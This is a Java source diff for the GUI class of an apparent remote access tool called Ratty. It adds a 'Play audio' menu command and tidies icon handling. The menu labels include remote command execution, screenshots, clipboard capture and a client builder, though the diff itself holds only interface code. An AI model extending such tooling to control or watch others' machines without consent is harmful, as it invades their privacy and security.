@@ -8,9 +8,9 @@ import java.awt.event.ActionEvent;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 import java.awt.image.BufferedImage;
-import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.List;
 
-import javax.swing.Icon;
 import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JFrame;
@@ -44,7 +44,7 @@ public final class RattyGui {
 	private static final BufferedImage GUI_ICON_MEDIUM = ImageUtils.scaleImage(ImageUtils.loadImage("/gui_icon.png"), 64, 64);
 	private static final BufferedImage GUI_ICON_LARGE = ImageUtils.scaleImage(ImageUtils.loadImage("/gui_icon.png"), 128, 128);
 	private static final BufferedImage[] MENU_ICONS = new SpriteSheet("/menu_icons.png", 32, 32).getSprites();
-	private static final ArrayList<BufferedImage> GUI_ICONS = new ArrayList<BufferedImage>(3);
+	private static final List<BufferedImage> GUI_ICONS = Arrays.asList(GUI_ICON_SMALL, GUI_ICON_MEDIUM, GUI_ICON_LARGE);
 	
 	public static final String POPUP = "Open popup";
 	public static final String SCREENSHOT = "Take screenshot";
@@ -54,6 +54,7 @@ public final class RattyGui {
 	public static final String COMMAND = "Execute command";
 	public static final String CLIPBOARD = "Get clipboard content";
 	public static final String WEBSITE = "Open website";
+	public static final String AUDIO = "Play audio";
 	public static final String FREE = "Free client";
 	public static final String BUILD = "Client builder";
 	
@@ -65,15 +66,10 @@ public final class RattyGui {
 		FILES,
 		COMMAND,
 		CLIPBOARD,
+		AUDIO,
 		WEBSITE,
 		FREE
 	};
-	
-	static {
-		GUI_ICONS.add(GUI_ICON_SMALL);
-		GUI_ICONS.add(GUI_ICON_MEDIUM);
-		GUI_ICONS.add(GUI_ICON_LARGE);
-	}
 	
 	public RattyGui() {
 		frame = new JFrame();
@@ -86,9 +82,9 @@ public final class RattyGui {
 		
 		for (int i = 0; i < COMMANDS.length && i < MENU_ICONS.length; i++) {
 			final String command = COMMANDS[i];
-			final ImageIcon icon = new ImageIcon(MENU_ICONS[i]);
+			final BufferedImage image = MENU_ICONS[i];
 			
-			addMenuItem(command, icon);
+			addMenuItem(command, image);
 		}
 		
 		final Container container = frame.getContentPane();
@@ -122,8 +118,9 @@ public final class RattyGui {
 		frame.requestFocus();
 	}
 	
-	private void addMenuItem(final String name, final Icon icon) {
+	private void addMenuItem(final String name, final BufferedImage image) {
 		final JMenuItem item = new JMenuItem(name);
+		final ImageIcon icon = new ImageIcon(image);
 		
 		item.setActionCommand(name);
 		item.addActionListener(this::actionPerformed);
